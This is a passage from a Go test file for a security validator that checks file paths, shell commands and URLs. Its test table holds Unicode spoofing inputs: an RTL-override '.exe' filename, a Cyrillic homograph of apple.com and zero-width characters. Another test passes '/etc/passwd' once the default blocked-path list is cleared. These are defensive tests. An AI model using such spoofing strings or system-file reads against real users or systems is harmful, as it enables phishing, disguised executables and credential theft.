		if err := v.ValidateURL(""); err == nil {
			t.Error("expected empty URL to fail")
		}
	})

	t.Run("whitespace-only inputs", func(t *testing.T) {
		v := NewDefaultValidator()

		// Whitespace-only command
		if err := v.ValidateCommand("   \t\n  ", nil); err == nil {
			t.Error("expected whitespace-only command to fail")
		}
	})

	t.Run("very long inputs", func(t *testing.T) {
		v := NewDefaultValidator()

		// Very long path
		longPath := "/tmp/" + strings.Repeat("a", 4096)
		if err := v.ValidatePath(longPath); err != nil {
			t.Errorf("expected long valid path to pass, got: %v", err)
		}

		// Very long command
		longCmd := "echo " + strings.Repeat("a", 4096)
		if err := v.ValidateCommand(longCmd, nil); err != nil {
			t.Errorf("expected long valid command to pass, got: %v", err)
		}
	})

	t.Run("unicode handling", func(t *testing.T) {
		v := NewDefaultValidator()

		// Unicode in paths
		unicodePath := "/tmp/файл.txt" // Russian filename
		if err := v.ValidatePath(unicodePath); err != nil {
			t.Errorf("expected unicode path to pass, got: %v", err)
		}

		// Unicode in commands
		unicodeCmd := "echo \"привет\"" // Russian text
		if err := v.ValidateCommand(unicodeCmd, nil); err != nil {
			t.Errorf("expected unicode command to pass, got: %v", err)
		}

		// Unicode in URLs
		unicodeURL := "https://пример.рф" // Russian domain
		if err := v.ValidateURL(unicodeURL); err != nil {
			t.Errorf("expected unicode URL to pass, got: %v", err)
		}
	})

	t.Run("special characters", func(t *testing.T) {
		v := NewDefaultValidator()

		// Special characters in paths
		specialPath := "/tmp/file with spaces & symbols!@#$%^&*()_+-={}[]|\\:;\"'<>?,.~`"
		if err := v.ValidatePath(specialPath); err != nil {
			t.Errorf("expected path with special chars to pass, got: %v", err)
		}

		// Control characters
		for i := 0; i < 32; i++ {
			controlChar := string(rune(i))
			pathWithControl := "/tmp/file" + controlChar + ".txt"
			// These should generally pass as Go handles them safely
			_ = v.ValidatePath(pathWithControl) // Just ensure no panic
		}
	})

	t.Run("nil and invalid inputs", func(t *testing.T) {
		v := NewDefaultValidator()

		// Command with nil args should work
		if err := v.ValidateCommand("echo test", nil); err != nil {
			t.Errorf("expected command with nil args to pass, got: %v", err)
		}
	})
}

// TestUnicodeAttacks tests Unicode-based security attacks
func TestUnicodeAttacks(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		test    func(*DefaultValidator, string) error
		wantErr bool
	}{
		// Unicode normalization attacks
		{
			name:    "NFD normalization in path",
			input:   "/tmp/cafe\u0301.txt", // café with combining accent
			test:    func(v *DefaultValidator, s string) error { return v.ValidatePath(s) },
			wantErr: false,
		},
		{
			name:    "NFKC normalization attack",
			input:   "/tmp/\uFF2E\uFF2F\uFF32\uFF2D\uFF21\uFF2C.txt", // "NORMAL" in fullwidth
			test:    func(v *DefaultValidator, s string) error { return v.ValidatePath(s) },
			wantErr: false,
		},

		// Bidirectional text attacks
		{
			name:    "RTL override in filename",
			input:   "/tmp/file\u202etxt.exe", // RLO character
			test:    func(v *DefaultValidator, s string) error { return v.ValidatePath(s) },
			wantErr: false,
		},

		// Zero-width characters
		{
			name:    "zero width space in command",
			input:   "ec\u200Bho test", // Zero-width space
			test:    func(v *DefaultValidator, s string) error { return v.ValidateCommand(s, nil) },
			wantErr: false,
		},
		{
			name:    "zero width non-joiner",
			input:   "https://exam\u200Cple.com",
			test:    func(v *DefaultValidator, s string) error { return v.ValidateURL(s) },
			wantErr: false,
		},

		// Homograph attacks
		{
			name:    "cyrillic homograph",
			input:   "https://аpple.com", // Cyrillic 'а'
			test:    func(v *DefaultValidator, s string) error { return v.ValidateURL(s) },
			wantErr: false,
		},

		// Overlong UTF-8 sequences (Go handles these correctly)
		{
			name:    "valid unicode path",
			input:   "/tmp/\u0041\u0042\u0043.txt", // ABC in Unicode
			test:    func(v *DefaultValidator, s string) error { return v.ValidatePath(s) },
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			v := NewDefaultValidator()
			err := tt.test(v, tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("test failed: error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// TestErrorHandling tests error handling and edge cases
func TestErrorHandling(t *testing.T) {
	t.Run("validator configuration errors", func(t *testing.T) {
		v := NewDefaultValidator()

		// Test with empty allowed paths list
		v.WithAllowedPaths([]string{})
		if err := v.ValidatePath("/any/path"); err != nil {
			t.Errorf("expected path to pass with empty allowed list, got: %v", err)
		}

		// Test with empty blocked paths list
		v = NewDefaultValidator()
		v.blockedPaths = []string{} // Clear default blocked paths
		if err := v.ValidatePath("/etc/passwd"); err != nil {
			t.Errorf("expected path to pass with empty blocked list, got: %v", err)
		}
	})

	t.Run("malformed URL parsing", func(t *testing.T) {
		v := NewDefaultValidator()

		malformedURLs := []string{
			"ht!tp://example.com",
			"https://[invalid-ipv6",
			"%zzexample.com",
		}

		for _, malformedURL := range malformedURLs {
			err := v.ValidateURL(malformedURL)
			if err == nil {
				t.Errorf("expected malformed URL %q to fail", malformedURL)
			}
		}
	})

	t.Run("filesystem permission errors", func(t *testing.T) {
		v := NewDefaultValidator()

		// Test with non-existent symlink target (should not fail validation)
		nonExistentPath := "/path/that/does/not/exist/symlink"
		// This should pass validation as the path itself is not blocked
		if err := v.ValidatePath(nonExistentPath); err != nil {
			t.Errorf("expected non-existent path to pass validation, got: %v", err)
		}
	})
}
